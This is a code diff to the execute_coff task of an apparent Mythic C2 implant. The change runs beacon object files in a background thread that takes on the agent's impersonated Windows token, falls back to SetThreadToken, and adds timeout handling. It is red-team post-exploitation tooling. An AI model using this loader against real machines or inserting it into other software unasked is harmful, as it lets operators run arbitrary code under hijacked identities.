@@ -15,7 +15,9 @@ using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
+using System.Security.Principal;
 using System.Text;
+using System.Threading;
 using static Tasks.execute_coff;
 
 
@@ -31,7 +33,7 @@ namespace Tasks
             [DataMember(Name = "function_name")]
             public string FunctionName;
             [DataMember(Name = "timeout")]
-            public string timeout;
+            public int timeout;
             [DataMember(Name = "coff_arguments")]
             public String PackedArguments;
             [DataMember(Name = "bof_id")]
@@ -48,6 +50,14 @@ namespace Tasks
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate IntPtr BeaconGetOutputDataDelegate([In, Out] ref int outsize);
+        // Add imported SetThreadToken API for thread token manipulation
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool SetThreadToken(
+            ref IntPtr ThreadHandle,
+            IntPtr Token);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetCurrentThread();
 
         private static RunCOFFDelegate? _RunCOFF;
         private static UnhexlifyDelegate? _Unhexlify;
@@ -982,6 +992,150 @@ namespace Tasks
             }
             return true;
         }
+        // Class to hold the state for COFF execution thread
+        private class COFFExecutionState
+        {
+            public IAgent Agent { get; set; }
+            public string FunctionName { get; set; }
+            public IntPtr CoffData { get; set; }
+            public uint FileSize { get; set; }
+            public IntPtr ArgumentData { get; set; }
+            public int ArgumentSize { get; set; }
+            public int Status { get; set; }
+            public AutoResetEvent CompletionEvent { get; set; }
+            public string Output { get; set; }
+            public Exception Error { get; set; }
+        }
+
+        // Method to run COFF in a separate thread
+        private static void ExecuteCOFFThreadFunc(object state)
+        {
+            COFFExecutionState executionState = (COFFExecutionState)state;
+            IAgent agent = executionState.Agent;
+            try
+            {
+                DebugHelp.DebugWriteLine($"Starting COFF execution in thread {Thread.CurrentThread.ManagedThreadId}");
+                WindowsImpersonationContext tokenApplied;
+                if (!agent.GetIdentityManager().IsOriginalIdentity())
+                {
+                    DebugHelp.DebugWriteLine("Applying impersonation token to COFF execution thread");
+                    try
+                    {
+                        // Impersonate the current identity in this new thread
+                        tokenApplied = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate();
+                        DebugHelp.DebugWriteLine($"Successfully applied token for {agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name} to COFF thread");
+                        // Debug information about the current token
+                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
+                        DebugHelp.DebugWriteLine($"Thread identity after impersonation attempt: {currentThreadIdentity.Name}");
+                        //DebugHelp.DebugWriteLine($"Thread token type: {currentThreadIdentity.Token.ToInt64():X}");
+                        //DebugHelp.DebugWriteLine($"Is authenticated: {currentThreadIdentity.IsAuthenticated}");
+                        //DebugHelp.DebugWriteLine($"Authentication type: {currentThreadIdentity.AuthenticationType}");
+
+                        // List of groups/claims
+                        //DebugHelp.DebugWriteLine("Token groups/claims:");
+                        //foreach (var claim in currentThreadIdentity.Claims)
+                        //{
+                        //    DebugHelp.DebugWriteLine($"  - {claim.Type}: {claim.Value}");
+                        //}
+
+                        // Compare with expected identity
+                        string expectedName = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name;
+                        DebugHelp.DebugWriteLine($"Expected identity: {expectedName}");
+                        DebugHelp.DebugWriteLine($"Identity match: {expectedName == currentThreadIdentity.Name}");
+
+                    }
+                    catch (Exception ex)
+                    {
+                        DebugHelp.DebugWriteLine($"Error applying token to thread: {ex.Message}");
+                        // Fallback to using SetThreadToken API directly
+                        IntPtr threadHandle = GetCurrentThread();
+                        IntPtr tokenHandle = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Token;
+
+                        bool result = SetThreadToken(ref threadHandle, tokenHandle);
+                        if (result)
+                        {
+                            DebugHelp.DebugWriteLine("Successfully applied token using SetThreadToken API");
+                            // Verify identity after SetThreadToken
+                            WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
+                            DebugHelp.DebugWriteLine($"Thread identity after SetThreadToken: {currentThreadIdentity.Name}");
+                        }
+                        else
+                        {
+                            int error = Marshal.GetLastWin32Error();
+                            DebugHelp.DebugWriteLine($"SetThreadToken failed with error: {error}");
+                        }
+                    }
+                }
+                else
+                {
+                    DebugHelp.DebugWriteLine("Using original identity for COFF execution");
+                    try
+                    {
+                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
+                        DebugHelp.DebugWriteLine($"Thread identity (original): {currentThreadIdentity.Name}");
+                    }
+                    catch (Exception ex)
+                    {
+                        DebugHelp.DebugWriteLine($"Error getting current identity: {ex.Message}");
+                    }
+                }
+                // Execute the COFF
+                executionState.Status = _RunCOFF(
+                    executionState.FunctionName,
+                    executionState.CoffData,
+                    executionState.FileSize,
+                    executionState.ArgumentData,
+                    executionState.ArgumentSize);
+
+                DebugHelp.DebugWriteLine($"COFF execution completed with status: {executionState.Status}");
+
+                // Get output data if execution was successful
+                if (executionState.Status == 0)
+                {
+                    int outdataSize = 0;
+                    IntPtr outdata = _BeaconGetOutputData(ref outdataSize);
+
+                    if (outdata != IntPtr.Zero && outdataSize > 0)
+                    {
+                        byte[] outDataBytes = new byte[outdataSize];
+                        Marshal.Copy(outdata, outDataBytes, 0, outdataSize);
+                        executionState.Output = Encoding.Default.GetString(outDataBytes);
+                        DebugHelp.DebugWriteLine($"Retrieved {outdataSize} bytes of output data");
+                    }
+                    else
+                    {
+                        executionState.Output = "No Output";
+                        DebugHelp.DebugWriteLine("No output data was returned from COFF execution");
+                    }
+                }
+                else
+                {
+                    DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
+                }
+                try
+                {
+                    DebugHelp.DebugWriteLine("Reverting impersonation in COFF thread");
+                    WindowsIdentity.Impersonate(IntPtr.Zero);
+                }
+                catch (Exception ex)
+                {
+                    DebugHelp.DebugWriteLine($"Error reverting impersonation: {ex.Message}");
+                }
+
+            }
+            catch (Exception ex)
+            {
+                DebugHelp.DebugWriteLine($"Exception in COFF execution thread: {ex.Message}");
+                DebugHelp.DebugWriteLine($"Exception stack trace: {ex.StackTrace}");
+                executionState.Error = ex;
+            }
+            finally
+            {
+                // Signal that execution is complete
+                DebugHelp.DebugWriteLine("Signaling COFF execution completion");
+                executionState.CompletionEvent.Set();
+            }
+        }
         public override void Start()
         {
             MythicTaskResponse resp;
@@ -989,7 +1143,7 @@ namespace Tasks
             try
             {
                 CoffParameters parameters = _jsonSerializer.Deserialize<CoffParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.CoffName) ||  string.IsNullOrEmpty(parameters.FunctionName) || string.IsNullOrEmpty(parameters.timeout))
+                if (string.IsNullOrEmpty(parameters.CoffName) ||  string.IsNullOrEmpty(parameters.FunctionName))
                 {
                     resp = CreateTaskResponse(
                         $"One or more required arguments was not provided.",
@@ -1040,26 +1194,77 @@ namespace Tasks
                 IntPtr coffArgs = _Unhexlify(parameters.PackedArguments, ref coffArgsSize);
                 IntPtr RunCOFFinputBuffer = Marshal.AllocHGlobal(coffBytes.Length * sizeof(byte));
                 Marshal.Copy(coffBytes, 0, RunCOFFinputBuffer, coffBytes.Length);
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("",false, $"Executing COFF {parameters.CoffName}"));
-                int status = _RunCOFF(parameters.FunctionName, RunCOFFinputBuffer, (uint)coffBytes.Length, coffArgs, coffArgsSize);
-                Marshal.FreeHGlobal(RunCOFFinputBuffer);
-                if (status == 0)
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("[*] Starting COFF Execution...\n\n",false, $"Executing COFF {parameters.CoffName}"));
+                // Create execution state object
+                COFFExecutionState executionState = new COFFExecutionState
                 {
-                    IntPtr outdata = _BeaconGetOutputData(ref outdataSize);
-                    if (outdata != null)
+                    Agent = _agent,
+                    FunctionName = parameters.FunctionName,
+                    CoffData = RunCOFFinputBuffer,
+                    FileSize = (uint)coffBytes.Length,
+                    ArgumentData = coffArgs,
+                    ArgumentSize = coffArgsSize,
+                    CompletionEvent = new AutoResetEvent(false),
+                    Output = "No Output"
+                };
+                try
+                {
+                    // Start execution in a separate thread
+                    DebugHelp.DebugWriteLine("Starting COFF execution thread");
+                    Thread executionThread = new Thread(new ParameterizedThreadStart(ExecuteCOFFThreadFunc));
+                    executionThread.IsBackground = true; // Make thread a background thread so it doesn't keep process alive
+                    executionThread.Start(executionState);
+
+                    // Wait for the thread to complete or timeout
+                    DebugHelp.DebugWriteLine($"Waiting for COFF execution to complete (timeout: {parameters.timeout * 1000} ms)");
+                    int timeout = parameters.timeout * 1000 > 0 ? parameters.timeout * 1000 : -1;
+                    bool completed = executionState.CompletionEvent.WaitOne(timeout);
+
+                    if (!completed)
                     {
-                        byte[] outData = new byte[outdataSize];
-                        Marshal.Copy(outdata, outData, 0, outdataSize);
-                        resp = CreateTaskResponse(Encoding.Default.GetString(outData), true);
-                    } else
-                    {
-                        resp = CreateTaskResponse("No Output", true);
+                        // Execution timed out
+                        executionThread.Abort();
+                        DebugHelp.DebugWriteLine("COFF execution timed out");
+                        resp = CreateTaskResponse(
+                            $"COFF execution timed out after {parameters.timeout} seconds",
+                            true,
+                            "error");
                     }
-                } else
+                    else if (executionState.Error != null)
+                    {
+                        // Execution threw an exception
+                        Exception ex = executionState.Error;
+                        DebugHelp.DebugWriteLine($"COFF execution threw exception: {ex.Message}");
+                        resp = CreateTaskResponse(
+                            $"Exception during COFF execution: {ex.Message} \nLocation: {ex.StackTrace}",
+                            true,
+                            "error");
+                    }
+                    else if (executionState.Status != 0)
+                    {
+                        // Execution completed with an error status
+                        DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
+                        resp = CreateTaskResponse(
+                            $"RunCOFF failed with status: {executionState.Status}",
+                            true,
+                            "error");
+                    }
+                    else
+                    {
+                        // Execution completed successfully
+                        DebugHelp.DebugWriteLine("COFF execution completed successfully");
+                        resp = CreateTaskResponse(executionState.Output, true);
+                    }
+                }
+                finally
                 {
-                    resp = CreateTaskResponse($"RunCOFF Failed with status: {status}", true, "error");
+                    // Clean up resources
+                    DebugHelp.DebugWriteLine("Cleaning up COFF execution resources");
+                    Marshal.FreeHGlobal(RunCOFFinputBuffer);
+                    // No need to free coffArgs as it's managed by the COFF loader
                 }
             }
+
 
             catch (Exception ex)
             {
@@ -1069,6 +1274,7 @@ namespace Tasks
             }
 
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("\n[*] COFF Finished.", true));
         }
     }
 }
